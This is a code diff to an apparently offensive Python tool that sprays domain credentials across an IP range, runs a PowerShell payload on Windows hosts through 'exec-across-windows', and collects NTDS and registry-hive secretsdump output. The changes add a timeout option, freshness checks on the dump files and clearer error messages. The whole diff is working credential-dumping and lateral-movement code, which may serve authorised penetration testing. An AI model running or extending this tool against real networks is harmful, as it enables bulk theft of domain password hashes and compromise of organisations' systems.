@@ -9,6 +9,7 @@ import zipfile
 import shutil
 import sys
 import ssl
+import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -327,7 +328,7 @@ def process_registry_hives(zip_path, ip, just_dc_user=None):
         return ''
 
 
-def finalize_output(ip):
+def finalize_output(ip, run_start_time):
     """Combine NTDS dump (if exists) with secretsdump output"""
     extract_dir = os.path.join(UPLOAD_DIR, ip)
     ntds_file = os.path.join(extract_dir, f'ntds_{ip}.out')
@@ -336,7 +337,7 @@ def finalize_output(ip):
     output_parts = []
     
     # Check for NTDS dump
-    if os.path.exists(ntds_file):
+    if os.path.exists(ntds_file) and os.path.getmtime(ntds_file) > run_start_time:
         entries = parse_ds_file(ntds_file)
         ntds_output = format_ntds_output(entries)
         if ntds_output:
@@ -348,7 +349,7 @@ def finalize_output(ip):
     
     # Check for secretsdump output
     hives_output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
-    if os.path.exists(hives_output_file):
+    if os.path.exists(hives_output_file) and os.path.getmtime(hives_output_file) > run_start_time:
         with open(hives_output_file, 'r') as f:
             hives_output = f.read().strip()
             if hives_output:
@@ -452,8 +453,10 @@ https_server = None
 print_lock = threading.Lock()
 
 
-def run_secretsdump(ip, username, password, just_dc_user, verbose, show_single_output):
+def run_secretsdump(ip, username, password, just_dc_user, verbose, show_single_output, timeout=30):
     
+    run_start_time = time.time()
+
     with print_lock:
         print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
     
@@ -518,8 +521,8 @@ if ($isDC) {{
 '''
 
     try:
-                # Build the exec-across-windows command
-        exec_cmd = ["exec-across-windows", ip, username, password, ps_script, "--timeout", "30", "--threads", "1"]
+        # Build the exec-across-windows command
+        exec_cmd = ["exec-across-windows", ip, username, password, ps_script, "--timeout", str(timeout), "--threads", "1"]
         
         # Run with subprocess
         if verbose:
@@ -537,9 +540,9 @@ if ($isDC) {{
                     print(f"\033[31m[-]\033[0m Unable to secretsdump on {ip}. No necessary ports are available.")
             if "All tools failed for" in output:
                 with print_lock:
-                    print(f"\033[31m[-]\033[0m Unable to secretsdump on {ip}. No necessary ports are available.")
+                    print(f"\033[31m[-]\033[0m Unable to secretsdump on {ip}. Seems the credentials aren't working.")
 
-        final_content = finalize_output(ip)
+        final_content = finalize_output(ip, run_start_time)
         
         if final_content and show_single_output:
             with print_lock:
@@ -594,7 +597,8 @@ def main(args):
                 args.password,
                 args.just_dc_user,
                 args.verbose,
-                show_single_output
+                show_single_output,
+                args.timeout
             )
             for ip in targets
         ]
@@ -618,7 +622,8 @@ def main_cli():
     parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
     parser.add_argument("username", help="Domain username")
     parser.add_argument("password", help="Password")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
+    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
+    parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=20, help="Number of seconds before commands timeout")
     parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", help="Extract only one user.")
     parser.add_argument("-v", "--verbose", action="store_true",help="Show exec_across_windows output")
 
